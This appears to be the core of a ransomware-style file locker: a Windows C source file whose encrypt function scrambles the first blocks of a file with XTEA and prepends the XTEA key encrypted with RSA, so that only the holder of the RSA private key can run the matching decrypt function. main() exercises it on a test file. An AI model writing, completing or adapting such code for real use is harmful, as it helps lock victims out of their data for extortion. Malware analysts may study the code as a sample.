#include <windows.h>
#include <strsafe.h>
#include "xtea.h"
#include "rsa.h"

void encrypt(char *filename, void *xtea)
{
	HANDLE hOriginalFile, hEncryptedFile;
	DWORD dwFileSize;
	DWORD dwBytesRead, dwBytesWritten = 0;
	int i;
	char buffer[XTEA_BLOCK_SIZE + 1] = { 0 };
	char tmpFileName[MAX_PATH];

	hOriginalFile = CreateFile(filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hOriginalFile == INVALID_HANDLE_VALUE) return;

	/* Create temporary copy of the encrypted file */
	StringCchCopy(tmpFileName, MAX_PATH, filename);
	StringCchCat(tmpFileName, MAX_PATH, ".tmp");
	hEncryptedFile = CreateFile(tmpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hEncryptedFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		return;
	}

	dwFileSize = GetFileSize(hOriginalFile, NULL);
	if (dwFileSize < XTEA_BLOCK_SIZE * BLOCKS_TO_ENCRYPT)
	{
		CloseHandle(hOriginalFile);
		CloseHandle(hEncryptedFile);
		DeleteFile(tmpFileName);
		return;
	}

	/* Encrypt file header */
	for (i = 0; i < BLOCKS_TO_ENCRYPT; i++)
	{
		ZeroMemory(buffer, XTEA_BLOCK_SIZE + 1);
		SetFilePointer(hOriginalFile, i * XTEA_BLOCK_SIZE, NULL, FILE_BEGIN);
		ReadFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		xtea_encrypt(64, (uint32_t *)buffer, (uint32_t *)((XTEA_DATA *)xtea)->xtea_key);
		SetFilePointer(hOriginalFile, i * XTEA_BLOCK_SIZE, NULL, FILE_BEGIN);
		WriteFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesWritten, NULL);
	}

	/* Write 73 bytes of encrypted XTEA key to the begin of file */
	WriteFile(hEncryptedFile,((XTEA_DATA *)xtea)->rsa_encrypted_key, RSA_BLOCK_SIZE, &dwBytesWritten, NULL);
	SetFilePointer(hOriginalFile, 0, NULL, FILE_BEGIN);
	do
	{
		ReadFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		WriteFile(hEncryptedFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
	} while (dwBytesRead);

	CloseHandle(hOriginalFile);
	CloseHandle(hEncryptedFile);

	/* Replace original file with encrypted file and delete temporary file */
	CopyFile(tmpFileName, filename, FALSE);
	DeleteFile(tmpFileName);
}

void decrypt(char *filename, void *xtea)
{
	RSA_CONTEXT rsa;
	HANDLE hEncryptedFile, hOriginalFile;
	DWORD dwBytesRead = 0, dwBytesWritten = 0;
	int i;
	char key[RSA_BLOCK_SIZE];
	char rsa_block[RSA_BLOCK_SIZE];
	char buffer[XTEA_BLOCK_SIZE + 1];
	char tmpFileName[MAX_PATH];

	hEncryptedFile = CreateFile(filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hEncryptedFile == INVALID_HANDLE_VALUE) return;

	/* Create temporary file for decrypted data */
	StringCchCopy(tmpFileName, MAX_PATH, filename);
	StringCchCat(tmpFileName, MAX_PATH, ".tmp");
	hOriginalFile = CreateFile(tmpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hOriginalFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hEncryptedFile);
		CloseHandle(hOriginalFile);
		return;
	}

	/* Read encrypted XTEA key from the beginning of file */
	ZeroMemory(rsa_block, RSA_BLOCK_SIZE);
	ReadFile(hEncryptedFile, rsa_block, RSA_BLOCK_SIZE, &dwBytesRead, NULL);
	RSASetup(&rsa);
	RSADecrypt(&rsa, rsa_block, RSA_BLOCK_SIZE, key);
	RSAClear(&rsa);

	/* Decryption */
	for (i = 0; i < BLOCKS_TO_ENCRYPT; i++)
	{
		ZeroMemory(buffer, XTEA_BLOCK_SIZE);
		ReadFile(hEncryptedFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		xtea_decrypt(64, (uint32_t *)buffer, (uint32_t *)key);
		WriteFile(hOriginalFile, buffer, XTEA_BLOCK_SIZE, &dwBytesWritten, NULL);
	}

	/* Write remaining (unencrypted) file data */
	do
	{
		ReadFile(hEncryptedFile, buffer, XTEA_BLOCK_SIZE, &dwBytesRead, NULL);
		WriteFile(hOriginalFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
	} while (dwBytesRead);

	CloseHandle(hOriginalFile);
	CloseHandle(hEncryptedFile);

	/* Retain only decrypted file */
	CopyFile(tmpFileName, filename, FALSE);
	DeleteFile(tmpFileName);
}

int main(int argc, char *argv[])
{
	XTEA_DATA xtea;
	char file[MAX_PATH]  = "C:\\files\\test\\1.txt";

	/*xtea.KEY_SIZE = 16;
	xtea.XTEA_KEY_RANGE = 58;
	CopyMemory(xtea.xtea_key, "abcdabcdabcdabcd", 16);*/
	xtea_init(&xtea, 16, 58);

	//encrypt(file, &xtea);
	decrypt(file, &xtea);
}
